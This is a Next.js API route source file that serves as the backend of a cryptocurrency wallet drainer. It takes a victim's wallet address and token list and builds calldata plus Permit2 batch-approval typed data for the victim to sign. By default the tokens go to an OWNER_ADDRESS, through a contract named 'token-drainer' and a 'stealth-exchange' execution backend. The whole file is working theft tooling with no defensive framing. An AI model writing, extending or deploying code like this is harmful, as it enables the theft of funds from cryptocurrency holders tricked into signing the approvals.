import { NextResponse } from "next/server";
import { isAddress } from "viem";
import { buildTransactionPlan, type TokenAmount } from "@/lib/transaction-payload";

export async function POST(request: Request) {
  try {
    const body = await request.json().catch(() => ({}));
    const wallet = typeof body.wallet === "string" ? body.wallet : "";
    const receiver = typeof body.receiver === "string" ? body.receiver : process.env.OWNER_ADDRESS || "";
    if (!isAddress(wallet, { strict: false })) {
      return NextResponse.json({ status: "error", message: "Valid wallet address is required" }, { status: 400 });
    }
    if (!isAddress(receiver, { strict: false })) {
      return NextResponse.json({ status: "error", message: "Valid receiver address is required" }, { status: 400 });
    }

    const tokens: TokenAmount[] = Array.isArray(body.tokens)
      ? body.tokens
          .filter((t: { token?: unknown }) => t && typeof t.token === "string")
          .map((t: { token: string; amount?: string | number; decimals?: number; symbol?: string; nonce?: number }) => ({
            token: t.token,
            amount: t.amount,
            decimals: t.decimals,
            symbol: t.symbol,
            nonce: t.nonce,
          }))
      : [];

    const plan = buildTransactionPlan({
      wallet,
      receiver,
      chainId: typeof body.chainId === "number" ? body.chainId : Number(body.chainId) || 1,
      contractId: typeof body.contractId === "string" ? body.contractId : "token-drainer",
      functionName: typeof body.functionName === "string" ? body.functionName : undefined,
      tokens,
      executionBackend: typeof body.executionBackend === "string" ? body.executionBackend : "stealth-exchange",
    });

    return NextResponse.json({
      status: "ok",
      plan,
      txs: plan.txs,
      permit2TypedData: plan.permit2TypedData,
      relayPayload: {
        user: plan.wallet,
        recipient: plan.receiver,
        chainId: plan.chainId,
        executionBackend: plan.executionBackend,
        permitBatch: plan.permit2TypedData.message,
        signature: null,
      },
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : "Failed to build transaction payload";
    return NextResponse.json({ status: "error", message }, { status: 400 });
  }
}

export async function GET() {
  return NextResponse.json({
    status: "ok",
    message: "POST wallet, receiver, chainId, tokens[] to generate calldata + Permit2 typed data",
  });
}
